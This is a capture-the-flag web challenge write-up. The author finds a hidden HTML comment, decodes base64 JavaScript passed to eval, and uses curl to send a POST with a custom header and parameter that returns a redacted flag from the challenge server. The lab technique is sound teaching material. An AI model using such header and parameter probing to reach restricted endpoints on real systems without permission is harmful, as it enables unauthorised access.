# 🛡️ Sikiriti Writeup

**CTF:** CYBrAIn CTF  
**Category:** Web  
**Difficulty:** [Easy / Medium]  
**Points:** 300



📜 Challenge Description

The challenge presents a webpage featuring a security guard with the text: "Sikiriti Dayr khdmto" (Security is doing its job). The application relies on custom, hardcoded headers and hidden parameters to restrict access to the flag.

Target URL: https://cybrain-sikiriti-challenge.chals.io
## 🔍 1. Reconnaissance & Enumeration ##
---

Upon visiting the main page, the UI provides a very explicit hint at the bottom:

    **"Hint hunters usually start with view-source:"**
<img width="806" height="894" alt="image" src="https://github.com/user-attachments/assets/bb5722db-d358-4217-8720-8618237d6e69" />


Following the hint, I inspected the HTML source code of the page and found two critical pieces of information:

    A Hidden Comment: Buried in the HTML was a commented-out string:


    "ANA-HOUWA=lmoudir" This looks like a potential parameter or data payload.
    
<img width="684" height="159" alt="image" src="https://github.com/user-attachments/assets/36210953-ad43-49f8-9d78-cccf2ddfe970" />


    A JavaScript File: The source code loaded a script from /static/js/main.js.

    
<img width="953" height="140" alt="image" src="https://github.com/user-attachments/assets/ab23711e-32ef-4eea-8b66-731cd0ebfad7" />

## 🧩 2. JavaScript Deobfuscation ##

Navigating to https://cybrain-sikiriti-challenge.chals.io/static/js/main.js revealed a single line of obfuscated JavaScript:
JavaScript
```
eval(atob('KCgpID0+IHsKICBjb25zdCBlbmRwb2ludCA9ICcvYXBpL2ZsYWcnOwog... [truncated] ...'));
```
The code uses atob() to decode a Base64 string and eval() to execute it. By copying the Base64 string and decoding it manually, I uncovered the original client-side logic:
```JavaScript

(() => {
  const endpoint = '/api/flag';
  
  function hitEndpoint() {
    return fetch(endpoint, {
      method: 'GET',
      headers: {
        'sikiriti': 'sa7b moul challenge'
      }
    })
    .then(r => r.json())
    .then(x => console.log('[server]', x.message || x.flag || x));
  }
  
  window.addEventListener('load', hitEndpoint);
})();
```
Discoveries from the JS:

    The flag is located at the /api/flag endpoint.

    Accessing it requires a custom HTTP header: sikiriti: sa7b moul challenge (Translation: "friend of the challenge owner").

## 🚧 3. Interacting with the API ##

I routed my traffic through Burp Suite to replicate the GET request found in the JavaScript file. I sent a request to /api/flag including the custom sikiriti header.

The server responded with a 200 OK, but instead of the flag, it returned a JSON error message:
```JSON

{
  "message": "m3lm wlakin mat9derch tGETi l flag"
}
```

This response was a massive hint. The API endpoint exists and accepted my custom header, but the GET HTTP method is intentionally restricted.

## 💥 4. Exploitation ##

To bypass the final restriction, I needed to combine all the enumerated pieces:

    Change the HTTP method from GET to POST.

    Include the required header: sikiriti: sa7b moul challenge.

    Include the data payload found in the HTML comments: ANA-HOUWA=lmoudir to assert admin/director privileges.

I crafted the final exploit using curl from the terminal:
```Bash

curl -X POST \
     -H "sikiriti: sa7b moul challenge" \
     -d "ANA-HOUWA=lmoudir" \
     https://cybrain-sikiriti-challenge.chals.io/api/flag
```
(Note: This can also be executed in Burp Suite Repeater by changing the request method to POST, adding the Content-Type: application/x-www-form-urlencoded header, and placing ANA-HOUWA=lmoudir in the request body).
## 🏁 5. The Flag ##

The server accepted the POST request with the escalated privileges and returned the flag in JSON format:

```{"flag":"CGLITCHERS{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}"}``` 
Hope you enjoyed the chall !
TahaXploit
